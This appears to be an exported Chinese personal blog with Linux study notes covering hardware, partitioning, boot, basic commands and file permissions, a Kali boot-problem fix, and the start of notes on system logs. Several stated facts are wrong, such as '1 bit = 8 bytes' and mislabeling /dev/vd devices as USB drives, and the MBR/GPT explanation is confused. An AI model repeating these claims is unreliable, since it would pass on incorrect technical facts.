    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><div class="note info simple"><p>下面是我的总结</p>
</div>

<h1 id="计算机概述"><a href="#计算机概述" class="headerlink" title="计算机概述"></a>计算机概述</h1><h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><div class="note info simple"><p>为一个具有特定功能的芯片里面含有指令集，运行要参考CPU的指令集。</p>
</div>

<p>指令集有两个</p>
<ol>
<li>精简单指令集：就是运行简单的程序，时间短，性能差</li>
<li>复杂指令集：运行复杂，运行时间长，</li>
</ol>
<p>CPU分为两个单元</p>
<ol>
<li>算术逻辑单元</li>
<li>控制单元</li>
</ol>
<div class="note info simple"><p>电脑为什么叫<code>X86</code>，应为是CPU的代号，比如80286，又出来了新版本，80386等</p>
</div>



<h2 id="电脑按用途分类"><a href="#电脑按用途分类" class="headerlink" title="电脑按用途分类"></a>电脑按用途分类</h2><ol>
<li>超级计算机(Supercomputer )：就是运行最快的电脑，国家使用</li>
<li>大型计算机(Mainframe Computer )：这个都是大企业用</li>
<li>迷你电脑(Minicomputer )：用于科研</li>
<li>工作站(Workstation)，用于特定的环境使用</li>
<li>微电脑(Microcomputer )：个的笔记本和台式就是这个，</li>
</ol>
<h2 id="电脑的运算单位"><a href="#电脑的运算单位" class="headerlink" title="电脑的运算单位"></a>电脑的运算单位</h2><h3 id="容量单位"><a href="#容量单位" class="headerlink" title="容量单位"></a>容量单位</h3><div class="note info simple"><p>1位=8字节</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210320084033154.png" alt="image-20210320084033154"></p>
<h3 id="速度单位"><a href="#速度单位" class="headerlink" title="速度单位"></a>速度单位</h3><div class="note info simple"><p>CPU电脑是用的GHZ或者MHZ，hz就是每秒的处理次数</p>
</div>

<p>1GHZ=1000MHZ</p>
<h2 id="个人电脑架构和相关配件"><a href="#个人电脑架构和相关配件" class="headerlink" title="个人电脑架构和相关配件"></a>个人电脑架构和相关配件</h2><ul>
<li><p>北桥：负责连接运行速度较快的CPU，显卡，内存等部件</p>
</li>
<li><p>南桥：负责运行较慢的，比如USB，网卡等部件</p>
</li>
</ul>
<div class="note info simple"><p>现在内存控制器集成到CPU里面后就CPU和内存是直接交流的</p>
</div>



<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><div class="note info simple"><p>多通道设计</p>
<p>一个内存是64位，我们插上两个内存条就可以开双通道那就是128位</p>
</div>

<h2 id="硬盘和存储设备"><a href="#硬盘和存储设备" class="headerlink" title="硬盘和存储设备"></a>硬盘和存储设备</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210320111934972.png" alt="image-20210320111934972"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210323082748009.png" alt="image-20210323082748009"></p>
<div class="note info simple"><ol>
<li>上面的一个小块块叫做扇区(sector)</li>
<li>那同一个同心圆的扇区组合成的圆就是所谓的磁道(trac)</li>
<li>在一个硬盘上有很多的磁片，在所有盘片上面的同一个磁道可以组合成所谓的柱面 (cylinder )</li>
</ol>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210320111907405.png" alt="image-20210320111907405"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210320090023703.png" alt="image-20210320090023703"></p>
<h2 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h2><p>CMOS用于记录主板上的重要参数，包括系统时间，CPU电压与频率，个个设备的I/O地址与IRQ等，保存的是要电的所以主板上要有一个电池</p>
<p>BIOS他启动计算机，会加载CMOS。BIOS也可以修改CMOS</p>
<h1 id="主机计划和硬盘分区"><a href="#主机计划和硬盘分区" class="headerlink" title="主机计划和硬盘分区"></a>主机计划和硬盘分区</h1><p>硬盘阵列(RAID)利用硬件技术叫，个的硬盘合成一个大硬盘</p>
<h2 id="硬件设备在linux的文件名"><a href="#硬件设备在linux的文件名" class="headerlink" title="硬件设备在linux的文件名"></a>硬件设备在linux的文件名</h2><div class="note info simple"><p>linux下机会所以的硬件文件都在<code>/dev/</code>文件里面</p>
</div>

<div class="note info simple"><p>SATA(机械硬盘)接口在Linux的<code>/dev/sd[a-d]</code>文件里面，[a-d]就是其中的任意一个</p>
<p>SATA和USB都是用的SCSI模块来驱动的所以他的文件都是一样的</p>
</div>

<table>
<thead>
<tr>
<th align="left">设备</th>
<th align="left">设备在Linux内的文件名</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SCSI/SATA/USB硬盘机</td>
<td align="left">/dev/sd[a-p]</td>
</tr>
<tr>
<td align="left">USB 闪存盘</td>
<td align="left">/dev/vd[a-p] (用于虚拟机内)</td>
</tr>
<tr>
<td align="left">打印机</td>
<td align="left">/dev/lp[0-2] (25针打印机)<br/>/dev/usb/lp[0-15] (USB 接口)</td>
</tr>
<tr>
<td align="left">鼠标</td>
<td align="left">/dev/input/mouse[0-15] (通用)<br/>/dev/psaux (PS/2界面)<br/>/dev/mouse (当前鼠标)</td>
</tr>
<tr>
<td align="left">CDROM/DVDROM</td>
<td align="left">/dev/scd[0-1] (通用)<br/>/dev/sr[0-1] (通用,CentOS 较常见)<br/>/dev/cdrom (当前 CDROM</td>
</tr>
<tr>
<td align="left">磁带机</td>
<td align="left">/dev/ht0 (IDE 界面)<br/>/dev/st0 (SATA/SCSI 界面)<br/>/dev/tape (当前磁带)</td>
</tr>
<tr>
<td align="left">IDE硬盘机</td>
<td align="left">/dev/hd[a-d] (旧式系统才有)</td>
</tr>
</tbody></table>
<p>虚拟机用的是virtio所在的文件在/dev/vd[a-p]</p>
<h2 id="硬盘分区"><a href="#硬盘分区" class="headerlink" title="硬盘分区"></a>硬盘分区</h2><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><div class="note info simple"><p>早期的linux都是兼容windows的MBR来引导的，都是放到第一个扇区里面，早期的扇区都是512字节</p>
</div>

<div class="note info simple"><p>他这个512字节的存放这两个内容</p>
</div>

<ol>
<li><p>主引导记录：MBR安装启动引导程序地方，有446字节</p>
</li>
<li><p>分区表：他有64字节他只能存4组记录区，每一个记录启始和结束主面号</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210323084233685.png" alt="image-20210323084233685"></p>
<div class="note info simple"><p>有的人可以分区分很多，这个是用的扩展分区，扩展分区可以记录更多的分区</p>
</div>

</li>
</ol>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210323084953725.png" alt="image-20210323084953725"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210323091237325.png" alt="image-20210323091237325"></p>
<ul>
<li>主要分区与扩展分区最多只能分4个</li>
<li>扩展分区只能有1个</li>
<li>逻辑分区是扩展分区记录的</li>
<li>扩展分区是不能格式化的</li>
<li>逻辑分区的限制在于操作系统linux能分64个逻辑分区</li>
</ul>
<h3 id="GPT"><a href="#GPT" class="headerlink" title="GPT"></a>GPT</h3><ul>
<li><p>上面的MBR分区是有限制的</p>
</li>
<li><p>系统不能抓取到2.2tb以上的硬盘容量</p>
</li>
</ul>
<p>然后就出来了GPT的硬盘</p>
<p>MBR只有一个512字节的第一个分区来记录，而GPT用的是34个LBA来记录的</p>
<p>MBR如果删除这个512字节的分区记录，就会导致全部死光光，MBR有34个之外，整个硬盘的最后34个也拿来备份</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210323092257452.png" alt="image-20210323092257452"></p>
<h1 id="电脑启动BIOS和Boot-secto和UIFI"><a href="#电脑启动BIOS和Boot-secto和UIFI" class="headerlink" title="电脑启动BIOS和Boot secto和UIFI"></a>电脑启动BIOS和Boot secto和UIFI</h1><h2 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h2><ol>
<li><strong>BIOS</strong>：他会启动第一个可以启动的设备</li>
<li><strong>MBR</strong>：第一个可以启动的设备的一个扇区内的主引导记录块，内含启动引导代码</li>
<li><strong>启动引导程序</strong>：他可以读取内核文件来执行</li>
<li><strong>内核文件</strong>：开始启动系统</li>
</ol>
<h2 id="Boot-sector"><a href="#Boot-sector" class="headerlink" title="Boot sector"></a>Boot sector</h2><p>Boot sector是什么</p>
<p>比如我的kali启动的时候他可以选择kali和win系统启动，</p>
<p>可以安装在MBR之外， 还可以安装在每个分区的开机扇区（boot sector）</p>
<ul>
<li>提供菜单：使用者可以选择不同的开机项目，这也是多重开机的重要功能！</li>
<li>载入核心文件：直接指向可开机的程序区段来开始操作系统；</li>
<li>转交其他loader：将开机管理功能转交给其他loader负责</li>
</ul>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210323093404901.png" alt="20210323093404901"></p>
<h1 id="linux-硬盘分区的选择"><a href="#linux-硬盘分区的选择" class="headerlink" title="linux 硬盘分区的选择"></a>linux 硬盘分区的选择</h1><div class="note info simple"><p>linux的目录结构，他的目录结构都是树的形式来的</p>
</div>





<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210329162622402.png" alt="image-20210329162622402"></p>
<p>​     </p>
<div class="note info simple"><p>他的分区计划</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210330112402682.png" alt="image-20210330112402682"></p>
<h1 id="linux的基本操作"><a href="#linux的基本操作" class="headerlink" title="linux的基本操作"></a>linux的基本操作</h1><h2 id="安装linux"><a href="#安装linux" class="headerlink" title="安装linux"></a>安装linux</h2><div class="note info simple"><p>制作启动U盘，可以用<code>dd</code>命令来写入U盘</p>
</div>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=系统镜像  of=U盘路径</span><br><span class="line">咧：</span><br><span class="line">	dd <span class="keyword">if</span>=xxxx.iso  of=/dev/sdc</span><br></pre></td></tr></table></figure>
<h2 id="图形化和命令行之间切换"><a href="#图形化和命令行之间切换" class="headerlink" title="图形化和命令行之间切换"></a>图形化和命令行之间切换</h2><ul>
<li>[Ctrl] + [Alt] + [F2] ~ [F6] :文本界面登陆 tty2 ~ tty6 终端机;</li>
<li>[Ctrl] + [Alt] + [F1] :图形接口桌面。</li>
</ul>
<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="命令的格式"><a href="#命令的格式" class="headerlink" title="命令的格式"></a>命令的格式</h3><div class="note info simple"><p>这linux里面是大小写敏感的，比如cd和CD是不一样的</p>
</div>

<p>linux的命令格式</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~ &gt;&gt; 1 2 3 4</span><br></pre></td></tr></table></figure>
<ul>
<li>1:命令</li>
<li>2:选项</li>
<li>3:参数</li>
<li>4:参数</li>
</ul>
<p>比如：</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210330113407481.png" alt="image-20210330113407481"></p>
<h3 id="终端日常命令和快捷键"><a href="#终端日常命令和快捷键" class="headerlink" title="终端日常命令和快捷键"></a>终端日常命令和快捷键</h3><h4 id="日常命令"><a href="#日常命令" class="headerlink" title="日常命令"></a>日常命令</h4><ol>
<li><p>显示日期时间命令<code>datew</code></p>
<p>这个命令是现实当前系统的时间</p>
<p>直接运行的结果</p>
</li>
</ol>
<p>   <img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210330114021230.png" alt="image-20210330114021230"></p>
<p>   我们还可以添加<code>%Y/%m/%d</code>修改显示格式</p>
<p>   <img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210330114247767.png" alt="image-20210330114247767"></p>
<p>   或者只显示时间<code>%H:%M</code></p>
<p>   <img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210330114355655.png" alt="image-20210330114355655"></p>
<ol>
<li>显示日期命令<code>cal</code></li>
</ol>
<pre><code>![image-20210331101309799](https://cdn.jsdelivr.net/gh/wzass/zp/image-20210331101309799.png)

我们想查看指定的那年可以直接输入那年就可以了比如`cal  2021`

![image-20210331101606813](https://cdn.jsdelivr.net/gh/wzass/zp/image-20210331101606813.png)

我们也可以直接输入几月比如`cal 3 2021`

![image-20210331101857059](https://cdn.jsdelivr.net/gh/wzass/zp/image-20210331101857059.png)</code></pre>
<ol start="3">
<li><p>终端计算器<code>bc</code>命令</p>
<p> <img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210331102419576.png" alt="image-20210331102419576"></p>
</li>
</ol>
<h4 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h4><p>在终端<br><code>Shift+PagePU</code><strong>向前翻</strong><br><code>Shift+PageDown</code><strong>向后翻</strong></p>
<h3 id="在线帮助命令"><a href="#在线帮助命令" class="headerlink" title="在线帮助命令"></a>在线帮助命令</h3><ol>
<li><p><code>--help</code>工具在开发的时候都会添加这个帮助参数他的</p>
<p> 比如我们想查看<code>ls</code>的帮助<br> 可以用–help来查看</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ls --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<p> <img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210331104247852.png" alt="image-20210331104247852"></p>
</li>
<li><p>man命令可以查看更详细的使用说明<br> <img src= "/img/loading2.gif" data-lazy-src="/home/zss/.config/Typora/typora-user-images/image-20210331110102984.png" alt="image-20210331110102984"></p>
</li>
<li><p>info命令这个命令和man命令差不多就是他不是直接输出一大堆</p>
</li>
<li><p>有点软件，不只会告诉你他的使用还会告诉你他的原理他的说明文件在<code>/usr/share/doc</code>目录里面</p>
<p> <img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210401172322201.png" alt="image-20210401172322201"></p>
</li>
</ol>
<ol start="5">
<li><p>简单的文本编辑器<code>nano</code></p>
<p>他的快捷键</p>
<ul>
<li><code>[ctrl]-G</code> :取得线上说明( help),很有用的!</li>
<li><code>[ctrl]-X</code>:离开naon 软件,若有修改过文件会提示是否需要储存喔!</li>
<li><code>[ctrl]-O</code> :储存盘案,若你有权限的话就能够储存盘案了;</li>
<li><code>[ctrl]-R</code> :从其他文件读入数据,可以将某个文件的内容贴在本文件中;</li>
<li><code>[ctrl]-W</code>:搜寻字串,这个也是很有帮助的指令喔!</li>
<li><code>[ctrl]-C</code>:说明目前光标所在处的行数与列数等信息;</li>
<li><code>[ctrl]-_</code>:可以直接输入行号,让光标快速移动到该行;</li>
<li><code>[alt]-Y</code> :校正语法功能打开或关闭(按一下开、再按一下关)</li>
<li><code>[alt]-M</code>:可以支持鼠标来移动光标的功能</li>
</ul>
</li>
</ol>
<h3 id="正确关机方法"><a href="#正确关机方法" class="headerlink" title="正确关机方法"></a>正确关机方法</h3><p>如果强制关机会导致系统的服务突然中断</p>
<div class="note info simple"><p>计算机都是从硬盘写入到内存在到CPU，数据常常会从内存写回到硬盘这样就会导致系统变慢，<br>而在linux为了给系统提速好，默认有的已经加载到内存里面的数据不会直接写入到硬盘，他会在内存里面停留一会，如果你重写那么系统性能就会变快<br>如果万一关机就会导致数据更新不正常<br>我们可以用<code>sync</code>命令来叫内存的数据写回硬盘里面</p>
</div>

<div class="note info simple"><p>目前的常用的关键命令都会用<code>sync</code></p>
</div>

<ul>
<li><p>正确的关机命令</p>
<ol>
<li><p><code>shutdown</code> 关机默认30秒后关机，加上<code>now</code>就会立即关机</p>
<p> <img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210401113117993.png" alt="image-20210401113117993"></p>
</li>
<li><p>重启命令<code>reboot</code>，<code>halt</code>，<code>poweroff</code></p>
</li>
</ol>
</li>
</ul>
<h1 id="用户和用户组"><a href="#用户和用户组" class="headerlink" title="用户和用户组"></a>用户和用户组</h1><h2 id="用户管理的文件夹"><a href="#用户管理的文件夹" class="headerlink" title="用户管理的文件夹"></a>用户管理的文件夹</h2><ul>
<li>普通用户和root相关信息都记录在<code>/etc/passwd</code></li>
<li>个人秘密都记录在<code>/etc/shadow</code></li>
<li>用户组都记录在<code>/etc/group·</code></li>
</ul>
<h2 id="文件权限设置"><a href="#文件权限设置" class="headerlink" title="文件权限设置"></a>文件权限设置</h2><h3 id="文件属性查看"><a href="#文件属性查看" class="headerlink" title="文件属性查看"></a>文件属性查看</h3><p>命令<code>ls -al</code></p>
<p><code>a</code>参数是查看隐藏文件的</p>
<p>``l`是查看他的详细信息</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210408182541756.png" alt="image-20210408182541756"></p>
<h3 id="属性分析"><a href="#属性分析" class="headerlink" title="属性分析"></a>属性分析</h3><div class="note info simple"><p>输出内容分析</p>
</div>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">drwxr-xr-x  5 zss  zss    4096  3月 19 20:08 视频</span><br></pre></td></tr></table></figure>
<ol>
<li><p>第一个<code>drwxr-xr-x</code></p>
<p><code>r</code>是可读</p>
<p><code>w</code>是可写</p>
<p><code>x</code>是可执行</p>
<p><strong>他分四段</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210408183827914.png" alt="image-20210408183827914"></p>
<p>这个是文件类型权限</p>
<p><strong>第一个：</strong><code>d</code>这个<code>d</code>就是文件夹的意思如果是<code>-</code>他就是普通的文件，<code>l</code>则是链接文件，</p>
<p><strong>第二个:</strong> 文件拥有者的权限<br><strong>第三个:</strong> 用户的所属组</p>
<p><strong>第四个:</strong> 其他用户的权限</p>
</li>
<li><p>第二个<code>5</code></p>
<p>这个5是多少个文件名链接到此节点</p>
</li>
<li><p>第三个<code>zss</code>这个是这个文件的拥有者的用户</p>
</li>
<li><p>第四个<code>zss</code>这个文件所属的用户组</p>
</li>
<li><p>第五个<code>4096</code>这个是文件的大小默认单位是<code>Bytes</code></p>
</li>
<li><p>第六个<code>3月 19 20:08</code>创建的日期或修改的日期，可以加上<code>--full-time</code>查看年月日</p>
</li>
<li><p>第七个<code>视频</code>文件的名字</p>
</li>
</ol>
<h3 id="修改文件的权限"><a href="#修改文件的权限" class="headerlink" title="修改文件的权限"></a>修改文件的权限</h3><h4 id="chgrp修改文件的用户组"><a href="#chgrp修改文件的用户组" class="headerlink" title="chgrp修改文件的用户组"></a>chgrp修改文件的用户组</h4><p><strong>格式</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chgrp -R 用户组名 文件名字  <span class="comment"># -R就是连同目录下的全部文件都修改</span></span><br></pre></td></tr></table></figure>
<p><strong>测试</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210409111555168.png" alt="image-20210409111555168"></p>
<p>我就修改那个<code>bbb</code>文件夹，修改长<code>users</code>用户组</p>
<p>代码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chgrp -R users  bbb</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210409111825414.png" alt="image-20210409111825414"></p>
<h4 id="chown修改文件的拥有者"><a href="#chown修改文件的拥有者" class="headerlink" title="chown修改文件的拥有者"></a>chown修改文件的拥有者</h4><p>格式</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chown -R 账号名称 文件名字</span><br><span class="line">chown -R 账号名称:用户组名称 文件名字  <span class="comment"># -R就是连同目录下的全部文件都修改</span></span><br></pre></td></tr></table></figure>
<p>测试</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210409112557096.png" alt="image-20210409112557096"></p>
<p>我就修改上面那个圈住的</p>
<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chown -R root:root bbb</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210409112659070.png" alt="image-20210409112659070"></p>
<h4 id="chmod修改文件的权限"><a href="#chmod修改文件的权限" class="headerlink" title="chmod修改文件的权限"></a>chmod修改文件的权限</h4><div class="note info simple"><p>这个命令他有两个参数，一个是字符串一个是数字、</p>
<p>linux权限就有<code>-rwxrwxrwx</code>这九个他有三组，分别是<code>[user(用户)  group(组)  others(其他)]</code></p>
</div>

<h5 id="数字修改权限"><a href="#数字修改权限" class="headerlink" title="数字修改权限"></a>数字修改权限</h5><p>下面这个就是权限的对应表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r:4</span><br><span class="line">w:2</span><br><span class="line">x:1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">owner &#x3D; rwx &#x3D; 4+2+1 &#x3D; 7</span><br><span class="line">group &#x3D; rwx &#x3D; 4+2+1 &#x3D; 7</span><br><span class="line">others&#x3D; rwx &#x3D; 4+2+1 &#x3D; 7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>例如当权限为: <code>-rwxrwx--- </code>分数则是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">owner &#x3D; rwx &#x3D; 4+2+1 &#x3D; 7</span><br><span class="line">group &#x3D; rwx &#x3D; 4+2+1 &#x3D; 7</span><br><span class="line">others&#x3D; --- &#x3D; 0+0+0 &#x3D; 0</span><br></pre></td></tr></table></figure>
<p>命令是</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod 770 文件名</span><br></pre></td></tr></table></figure>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410150732349.png" alt="image-20210410150732349"></p>
<h5 id="符号类型修改权限"><a href="#符号类型修改权限" class="headerlink" title="符号类型修改权限"></a>符号类型修改权限</h5><p>格式</p>
<p>可以看见下面有一个<code>a</code>，这个<code>a</code>就是代表<code>ugo</code>全部</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410151711819.png" alt="image-20210410151711819"></p>
<p>咧我叫用户，组和其他都修改成只读</p>
<p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod ugo=r 文件名</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410152251742.png" alt="image-20210410152251742"></p>
<p>或者直接用一个<code>a</code>代表全部</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">chmod a=r 文件名</span><br></pre></td></tr></table></figure>
<p>结果是一样的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410152542675.png" alt="image-20210410152542675"></p>
<h4 id="权限的其他作用"><a href="#权限的其他作用" class="headerlink" title="权限的其他作用"></a>权限的其他作用</h4><p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410153353880.png" alt="image-20210410153353880"></p>
<h1 id="更新中。。。。。"><a href="#更新中。。。。。" class="headerlink" title="更新中。。。。。"></a>更新中。。。。。</h1>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux私房菜</tag>
      </tags>
  </entry>
  <entry>
    <title>kali linux解决you are in emergency mode</title>
    <url>/2021/01/25/linuxcor/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>这几天真的是真的吐了各种各样的问题</p>
<h1 id="kali-linux启动you-are-in"><a href="#kali-linux启动you-are-in" class="headerlink" title="kali linux启动you are in"></a>kali linux启动you are in</h1><p>启动的时候出来</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/IMG_20210125_153159.jpg" alt="IMG_20210125_153159"></p>
<h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>上面：输入密码</p>
<p>然后他就会有一个shell</p>
<p>自己分析发现这个问他是我挂载分区的导致的，我那个分区删除了找不到那个分区</p>
<p>输入</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/fstab</span><br></pre></td></tr></table></figure>
<p> 可以看见有一个分区这个分区我已经在系统里面删除了</p>
<p>注释他就解决了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210125175338433.png" alt="image-20210125175338433"></p>
<h1 id="kali-linux启动慢Begin"><a href="#kali-linux启动慢Begin" class="headerlink" title="kali linux启动慢Begin"></a>kali linux启动慢Begin</h1><p>上个问题刚解决写上笔记，又出现问题</p>
<p>我的kali linux启动都是5秒启动，我的kali是物理机，linux在启动都是很快的</p>
<p>上个<code>you are in emergency mode</code>刚解决又出现这个启动慢的问题</p>
<p>启动要30多秒，我以调试模式启动看启动的加载启动看到报Begin: Running /scripts/local-block … done</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/IMG_20210125_164548.jpg" alt="IMG_20210125_164548"></p>
<h1 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h1><p>在国内很这样的问题很少去国外找</p>
<p>找到了这个</p>
<p>文章<a href="https://forum.mxlinux.org/viewtopic.php?f=23&t=56351">https://forum.mxlinux.org/viewtopic.php?f=23&amp;t=56351</a></p>
<p>视频<a href="https://www.youtube.com/watch?v=w-XfOR4LDi0">https://www.youtube.com/watch?v=w-XfOR4LDi0</a></p>
<p>原来是initramfs有错误更新一下命令<code>update-initramfs -u</code>解决</p>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>日志文件分析</title>
    <url>/2021/03/08/linuxrz/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h1 id="记录的保存文件名"><a href="#记录的保存文件名" class="headerlink" title="记录的保存文件名"></a>记录的保存文件名</h1><ol>
<li><code>/var/log/boot.log</code>  电脑启动会叫日志信息会保存到这个文件里面，不会保存启动后的文件</li>
<li><code>/var/log/messages</code> 系统报错都会保存到这个文件里面</li>
<li><code>/var/log/lastlog</code>所有最近登录的信息</li>
<li><code>/var/log/cron</code>记录crontab</li>
<li><code>/var/log/dmesg</code>内核检查信息</li>
<li><code>/var/log/maillo``或 </code>/var/log/mail/`记录SMTP信息</li>
<li><code>/var/log/secure</code> 只要牵涉到“ 需要输入帐号密码”的软件</li>
<li><code>/var/log/wtmp</code>和<code>/var/log/faillog</code>记录登录成功和失败的账号信息</li>
</ol>
<h1 id="记录日志文件的程序"><a href="#记录日志文件的程序" class="headerlink" title="记录日志文件的程序"></a>记录日志文件的程序</h1><table>
<thead>
<tr>
<th align="left">程序名</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rsyslog.service</td>
<td align="left">主要登录系统与网络等服务的讯息</td>
</tr>
<tr>
<td align="left">logrotate</td>
<td align="left">主要在进行登录文件的轮替功能</td>
</tr>
<tr>
<td align="left">systemd-journald.service</td>
<td align="left">最主要的讯息收受者,由 systemd 提供的</td>
</tr>
</tbody></table>
<h1 id="rsyslog程序"><a href="#rsyslog程序" class="headerlink" title="rsyslog程序"></a>rsyslog程序</h1><div class="note info simple"><p>这个程序是统一管理，记录日志</p>
</div>



<h2 id="服务有没有开启"><a href="#服务有没有开启" class="headerlink" title="服务有没有开启"></a>服务有没有开启</h2><p>命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ps aux | grep rsyslog </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210308142456616.png" alt="image-20210308142456616"></p>
<h1 id="rsyslog程序修改配置文件"><a href="#rsyslog程序修改配置文件" class="headerlink" title="rsyslog程序修改配置文件"></a>rsyslog程序修改配置文件</h1><div class="note info simple"><p><code>rsyslog.service</code>的配置文件在<code>/etc/rsyslog.conf</code></p>
<p>我们可以通过配置文件修改日志文件的保存的地方</p>
</div>

<p>看一下文件内容</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/giteezp/image-20210308143139847.png" alt="image-20210308143139847"></p>
<div class="note info simple"><p>他的格式分三部分</p>
</div>

<ol>
<li>服务器名称</li>
<li>信息等级</li>
</ol>
<h2 id="服务器名称"><a href="#服务器名称" class="headerlink" title="服务器名称"></a>服务器名称</h2><div class="note info simple"><p><code>man  rsyslogd </code>这样可以了解他的配置的相关内容</p>
</div>

<div class="note info simple"><p>下面的内容都是linux内核syslog函数自行定制的服务名称</p>
</div>



<table>
<thead>
<tr>
<th>相对序号</th>
<th>服务类别</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>kern(kernel)</td>
<td>核心 (kernel) 产生的讯息，大部分都是硬件侦测以及核心功能的启用；</td>
</tr>
<tr>
<td>1</td>
<td>user</td>
<td>在用户层级所产生的信息，例如用户使用 logger 指令来记录登录文件的功能；</td>
</tr>
<tr>
<td>2</td>
<td>mail</td>
<td>只要与邮件收发有关的讯息记录都属于这个；</td>
</tr>
<tr>
<td>3</td>
<td>daemon</td>
